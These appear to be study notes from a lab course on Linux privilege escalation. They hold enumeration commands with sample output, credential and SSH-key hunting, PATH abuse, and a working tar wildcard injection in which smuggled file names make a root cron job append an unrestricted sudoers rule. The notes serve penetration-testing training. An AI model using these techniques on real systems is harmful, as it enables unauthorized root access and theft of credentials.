# Intro

Fully compromising the host would allow us to capture traffic and access sensitive files, which may be used to further access within the environment. Additionally, if the Linux machine is domain joined, we can gain the NTLM hash and begin enumerating and attacking Active Directory. 

## Enumeration

Check for :
- OS Version
- Kernel Version
- Running Services
- Installed Packages and Versions
- Logged in Users
- User Home Directories

## List Current Process

```bash
ps aux | grep root

root         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]
```

## Home Directories

User home folders may also contain <mark style="background: #ABF7F7A6;">SSH keys</mark> that can be used to access other systems or scripts and configuration files containing credentials.

```bash
ls /home

backupsvc  bob.jones  cliff.moore  logger  mrb3n  shared  stacey.jenkins
```

Check to see if files such as the `.bash_history` file are readable and contain any interesting commands, look for configuration files, and check to see if we can obtain copies of a user's SSH keys.

```bash
ls -la /home/stacey.jenkins/

total 32
drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .
drwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..
-rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history
-rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout
-rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc
-rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json
-rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profile
drwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh
```

## SSH Directory Contents

If you find an SSH key for your current user, this could be used to open an SSH session on the host (if SSH is exposed externally) and gain a stable and fully interactive session.

```bash
ls -l ~/.ssh

total 8
-rw------- 1 mrb3n mrb3n 1679 Aug 30 23:37 id_rsa
-rw-r--r-- 1 mrb3n mrb3n  393 Aug 30 23:37 id_rsa.pub
```

## Sudo List User's Privileges

```bash
sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

## Passwd

Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the shadow file, these can be subjected to an offline password cracking attack.

```bash
cat /etc/passwd
<...SNIP...>
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash
colord:x:111:118:colord colour management daemon,,,:/var/lib/colord:/bin/false
backupsvc:x:1001:1001::/home/backupsvc:
bob.jones:x:1002:1002::/home/bob.jones:
cliff.moore:x:1003:1003::/home/cliff.moore:
logger:x:1004:1004::/home/logger:
shared:x:1005:1005::/home/shared:
stacey.jenkins:x:1006:1006::/home/stacey.jenkins:
sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:
```

## Cron Jobs

```bash
ls -la /etc/cron.daily/

total 60
drwxr-xr-x  2 root root 4096 Aug 30 23:49 .
drwxr-xr-x 93 root root 4096 Aug 30 23:47 ..
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat
-rwx--x--x  1 root root  379 Aug 30 23:49 backup
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common
```

## Unmounted File Systems

If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

```bash
lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   30G  0 disk 
├─sda1   8:1    0   29G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1  848M  0 rom 
```

## Find Writable Directories

It is important to discover which directories are writable if you need to download tools to the system.

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

/dmz-backups
/tmp
/tmp/VMwareDnD
/proc
/dev/mqueue
/dev/shm
/var/tmp
/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp
/var/crash
/run/lock
```

## Find Writable Files

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>

/home/backupsvc/backup.sh
```

### Breakdown

- `find /` → Start searching from the root directory (`/`).   
- `-path /proc -prune` → Skip the `/proc` directory (since it’s a virtual filesystem).
- `-o` → OR; if not `/proc`, continue with the next condition.
- `-type f` → Match only **regular files**.
- `-perm -o+w` → Match files that are **world-writable** (writable by anyone).
- `2>/dev/null` → Suppress error messages (like “Permission denied”).

## Find User's Script

```bash
find / -type f -name "*.sh" 2>/dev/null
/usr/lib/python3/dist-packages/pexpect/bashrc.sh
/usr/lib/int-check.sh
/usr/lib/ifupdown/wait-for-ll6.sh
/usr/lib/ifupdown/settle-dad.sh
/usr/lib/ifupdown/wait-online.sh
/usr/lib/snapd/snapd.core-fixup.sh
/usr/lib/snapd/etelpmoc.sh
/usr/lib/snapd/complete.sh
/usr/lib/init/vars.sh
/usr/lib/open-iscsi/umountiscsi.sh
/usr/lib/open-iscsi/activate-storage.sh
/usr/lib/open-iscsi/logout-all.sh
/usr/lib/open-iscsi/startup-checks.sh
/usr/lib/recovery-mode/l10n.sh
/usr/lib/dracut/modules.d/90bcache/module-setup.sh
/usr/lib/console-setup/keyboard-setup.sh
/usr/lib/console-setup/console-setup.sh
/usr/lib/grub/i386-pc/modinfo.sh
/usr/bin/gettext.sh
```

# Environment Enumeration

Enumeration is the key to privilege escalation. Several helper scripts (such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and [LinEnum](https://github.com/rebootuser/LinEnum)) exist to assist with enumeration.

## OS Release

```bash
cat /etc/os-release

NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

## Path

```bash
echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

## env
```bash
env

SHELL=/bin/bash
PWD=/home/htb-student
LOGNAME=htb-student
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/htb-student
LANG=en_US.UTF-8

<SNIP>
```

## uname -a

```bash
uname -a

Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

## lscpu

```bash
lscpu 

Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   43 bits physical, 48 bits virtual
CPU(s):                          2
On-line CPU(s) list:             0,1
Thread(s) per core:              1
Core(s) per socket:              2
Socket(s):                       1
NUMA node(s):                    1
Vendor ID:                       AuthenticAMD
CPU family:                      23
Model:                           49
Model name:                      AMD EPYC 7302P 16-Core Processor
Stepping:                        0
CPU MHz:                         2994.375
BogoMIPS:                        5988.75
Hypervisor vendor:               VMware

<SNIP>
```

## Check for any defenses

We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:

- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

## lsblk

```bash
lsblk

NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   55M  1 loop /snap/core18/1705
loop1                       7:1    0   69M  1 loop /snap/lxd/14804
loop2                       7:2    0   47M  1 loop /snap/snapd/16292
loop3                       7:3    0  103M  1 loop /snap/lxd/23339
loop4                       7:4    0   62M  1 loop /snap/core20/1587
loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
sda                         8:0    0   20G  0 disk 
├─sda1                      8:1    0    1M  0 part 
├─sda2                      8:2    0    1G  0 part /boot
└─sda3                      8:3    0   19G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
sr0                        11:0    1  908M  0 rom 
```

## fstab

```bash
cat /etc/fstab

# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0
# /boot was on /dev/sda2 during curtin installation
/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0
```

## sudo groups

The `/etc/group` file lists all of the groups on the system. We can then use the [getent](https://man7.org/linux/man-pages/man1/getent.1.html) command to list members of any interesting groups.

```bash
getent group sudo

sudo:x:27:mrb3n
```

## Find hidden files & dirs

We need to be able to locate all hidden files and folders because they can often contain sensitive information

```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
-rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts
-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
-rw-r--r-- 1 htb-student htb-student 807 Nov 27 11:16 /home/htb-student/.profile
-rw-r--r-- 1 htb-student htb-student 0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful
-rw-r--r-- 1 htb-student htb-student 220 Nov 27 11:16 /home/htb-student/.bash_logout
-rw-rw-r-- 1 htb-student htb-student 162 Nov 28 13:26 /home/htb-student/.notes
```

```bash
find / -type d -name ".*" -ls 2>/dev/null

   684822      4 drwx------   3 htb-student htb-student     4096 Nov 28 12:32 /home/htb-student/.gnupg
   790793      4 drwx------   2 htb-student htb-student     4096 Okt 27 11:31 /home/htb-student/.ssh
   684804      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.cache
   790827      4 drwxrwxr-x   8 htb-student htb-student     4096 Okt 27 11:32 /home/htb-student/CVE-2021-3156/.git
   684796      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.config
   655426      4 drwxr-xr-x   3 htb-student htb-student     4096 Okt 27 11:19 /home/htb-student/.local
   524808      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.cache
   544027      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.config
   544028      4 drwxr-xr-x   3 gdm         gdm             4096 Aug 31 08:54 /var/lib/gdm3/.local
   524938      4 drwx------   2 colord      colord          4096 Okt 27 11:19 /var/lib/colord/.cac
```

## Temporary Files

```bash
ls -l /tmp /var/tmp /dev/shm
```


# Linux Services Enumeration

## Network Interfaces

```bash
ip a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:ed:2a brd ff:ff:ff:ff:ff:ff
    inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 3092sec preferred_lft 3092sec
    inet6 dead:beef::250:56ff:feb9:ed2a/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:ed2a/64 scope link 
       valid_lft forever preferred_lft forever
```

## Hosts

```bash
$ cat /etc/hosts

127.0.0.1 localhost
127.0.1.1 nixlpe02
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## User's Last Login

```bash
$ lastlog

Username         Port     From             Latest
root                                       **Never logged in**
daemon                                     **Never logged in**
bin                                        **Never logged in**
sys                                        **Never logged in**
sync                                       **Never logged in**
...SNIP...
systemd-coredump                           **Never logged in**
mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022
lxd                                        **Never logged in**
bjones                                     **Never logged in**
administrator.ilfreight                           **Never logged in**
backupsvc                                  **Never logged in**
cliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022
logger                                     **Never logged in**
shared                                     **Never logged in**
stacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022
htb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022      
```

## Logged in Users

```bash
$ w

 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
```

## Command History

Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.

```bash
$ history

    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
```

## Finding History Files

```bash
$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
```

## Cron

```zsh
$ ls -la /etc/cron.daily/

total 48
drwxr-xr-x  2 root root 4096 Aug  2 17:36 .
drwxr-xr-x 96 root root 4096 Aug  2 19:34 ..
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common
```

## Proc

The [proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) (`proc` / `procfs`) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information.

```zsh
$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

...SNIP...
startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:
htb-student
[priv]sshd:
htb-student
```

## Services

If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities.

```zsh
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

Listing...                                                 
accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1
accountsservice 0.6.55-0ubuntu12~20.04.5                   
acl 2.2.53-6                                               
acpi-support 0.143                                         
acpid 2.0.32-1ubuntu1                                      
adduser 3.118ubuntu2                                       
adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 
alsa-base 1.0.25+dfsg-0ubuntu5                             
alsa-topology-conf 1.2.2-1                                                       
apt-config-icons 0.12.10-2
apt-utils 2.0.9
...SNIP...
```

## Sudo Version

It's also a good idea to check if the `sudo` version installed on the system is vulnerable to any legacy or recent exploits.

```bash
$ sudo -V

Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

## Binaries

Occasionally it can also happen that no direct packages are installed on the system but compiled programs in the form of binaries.

```zsh
$ ls -l /bin /usr/bin/ /usr/sbin/

lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -> usr/bin

/usr/bin/:
total 175160
-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled
-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec
-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect
-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen
-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository
-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpart
lrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -> x86_64-linux-gnu-addr2line
...SNIP...

/usr/sbin/:
total 32500
-rwxr-xr-x 1 root root      3068 Mai 19  2020 aa-remove-unknown
-rwxr-xr-x 1 root root      8839 Mai 19  2020 aa-status
-rwxr-xr-x 1 root root       139 Jun 18  2019 aa-teardown
-rwxr-xr-x 1 root root     14728 Feb 25  2020 accessdb
-rwxr-xr-x 1 root root     60432 Nov 28  2019 acpid
-rwxr-xr-x 1 root root      3075 Jul  4 18:20 addgnupghome
lrwxrwxrwx 1 root root         7 Okt 27 11:14 addgroup -> adduser
-rwxr-xr-x 1 root root       860 Dez  7  2019 add-shell
-rwxr-xr-x 1 root root     37785 Apr 16  2020 adduser
-rwxr-xr-x 1 root root     69000 Feb  7  2022 agetty
-rwxr-xr-x 1 root root      5576 Jul 31  2015 alsa
-rwxr-xr-x 1 root root      4136 Apr 14  2021 alsabat-test
-rwxr-xr-x 1 root root    118176 Apr 14  2021 alsactl
-rwxr-xr-x 1 root root     26489 Apr 14  2021 alsa-info
-rwxr-xr-x 1 root root     39088 Jul 16  2019 anacron
...SNIP...

```

## GTFObins

[GTFObins](https://gtfobins.github.io/) provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. #gtfobins 

```zsh
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

Check GTFO for: ab                                         
Check GTFO for: apt                                        
Check GTFO for: ar                                         
Check GTFO for: as         
Check GTFO for: ash                                        
Check GTFO for: aspell                                     
Check GTFO for: at     
Check GTFO for: awk      
Check GTFO for: bash                                       
Check GTFO for: bridge
Check GTFO for: busybox
Check GTFO for: bzip2
Check GTFO for: cat
Check GTFO for: comm
Check GTFO for: cp
Check GTFO for: cpio
Check GTFO for: cupsfilter
Check GTFO for: curl
Check GTFO for: dash
Check GTFO for: date
Check GTFO for: dd
Check GTFO for: diff
```

## Trace System Calls

We can use the diagnostic tool `strace` on Linux-based operating systems to track and analyze system calls and signal processing.

```zsh
$ strace ping -c1 10.129.112.20

execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], 0x7ffdc8b96cc0 /* 80 vars */) = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
brk(NULL)                               = 0x56222584c000
arch_prctl(0x3001 /* ARCH_??? */, 0x7fffb0b2ea00) = -1 EINVAL (Invalid argument)
...SNIP...
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
...SNIP...
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3
...SNIP...
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 48, 848) = 48
...SNIP...
socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3
socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, NULL) = 0
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=0, permitted=0, inheritable=0}) = 0
openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY) = 5
...SNIP...
socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5
connect(5, {sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr("10.129.112.20")}, 16) = 0
getsockname(5, {sa_family=AF_INET, sin_port=htons(39885), sin_addr=inet_addr("10.129.112.20")}, [16]) = 0
close(5)                                = 0
...SNIP...
sendto(3, "\10\0\31\303\0\0\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., 64, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("10.129.112.20")}, 16) = 64
...SNIP...
recvmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("10.129.112.20")}, msg_namelen=128 => 16, msg_iov=[{iov_base="\0\0!\300\0\3\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., iov_len=192}], msg_iovlen=1, msg_control=[{cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SO_TIMESTAMP_OLD, cmsg_data={tv_sec=1675057253, tv_usec=699895}}, {cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[64]}], msg_controllen=56, msg_flags=0}, 0) = 64
write(1, "64 bytes from 10.129.112.20: icmp_se"..., 57) = 57
write(1, "\n", 1)                       = 1
write(1, "--- 10.129.112.20 ping statistics --"..., 34) = 34
write(1, "1 packets transmitted, 1 receive"..., 60) = 60
write(1, "rtt min/avg/max/mdev = 0.287/0.2"..., 50) = 50
close(1)                                = 0
close(2)                                = 0
exit_group(0)                           = ?
+++ exited with 0 +++
```

## Config Files

```zsh
$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf
-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf
-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf
-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf
...SNIP...
```

## Scripts

The scripts are similar to the configuration files. Often administrators are lazy and convinced of network security and neglect the internal security of their systems.

```zsh
$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

/home/htb-student/automation.sh
/etc/wpa_supplicant/action_wpa.sh
/etc/wpa_supplicant/ifupdown.sh
/etc/wpa_supplicant/functions.sh
/etc/init.d/keyboard-setup.sh
/etc/init.d/console-setup.sh
/etc/init.d/hwclock.sh
...SNIP...
```

## Running Services by User

```zsh
$ ps aux | grep root

...SNIP...
root           1  2.0  0.2 168196 11364 ?        Ss   12:31   0:01 /sbin/init splash
root         378  0.5  0.4  62648 17212 ?        S<s  12:31   0:00 /lib/systemd/systemd-journald
root         409  0.8  0.1  25208  7832 ?        Ss   12:31   0:00 /lib/systemd/systemd-udevd
root         457  0.0  0.0 150668   284 ?        Ssl  12:31   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root         752  0.0  0.2  58780 10608 ?        Ss   12:31   0:00 /usr/bin/VGAuthService
root         755  0.0  0.1 248088  7448 ?        Ssl  12:31   0:00 /usr/bin/vmtoolsd
root         772  0.0  0.2 250528  9388 ?        Ssl  12:31   0:00 /usr/lib/accountsservice/accounts-daemon
root         773  0.0  0.0   2548   768 ?        Ss   12:31   0:00 /usr/sbin/acpid
root         774  0.0  0.0  16720   708 ?        Ss   12:31   0:00 /usr/sbin/anacron -d -q -s
root         778  0.0  0.0  18052  2992 ?        Ss   12:31   0:00 /usr/sbin/cron -f
root         779  0.0  0.2  37204  8964 ?        Ss   12:31   0:00 /usr/sbin/cupsd -l
```

# Credential Hunting

These may be found in configuration files (`.conf`, `.config`, `.xml`, etc.), shell scripts, a user's bash history file, backup (`.bak`) files, within database files or even in text files.

The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access.

```bash
$ grep 'DB_USER\|DB_PASSWORD' wp-config.php

define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );
```

## SSH Keys

We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the <mark style="background: #ABF7F7A6;">known_hosts</mark> file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past

```zsh
$  ls ~/.ssh

id_rsa  id_rsa.pub  known_hosts
```

# Path Abuse

```bash
$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file.

```bash
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

$ touch ls
$ echo 'echo "PATH ABUSE!!"' > ls
$ chmod +x ls

$ ls

PATH ABUSE!!
```

# Wildcard Abuse

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions.

Consider the following cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`.

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names.

```bash
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, <mark style="background: #FFF3A3A6;">`--checkpoint=1`</mark> and <mark style="background: #FFF3A3A6;">`--checkpoint-action=exec=sh root.sh`</mark> is passed to <mark style="background: #FFF3A3A6;">`tar`</mark> as command-line options.

```zsh
$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

```zsh
$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

# Escaping Restricted Shell

A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. 

## RBASH

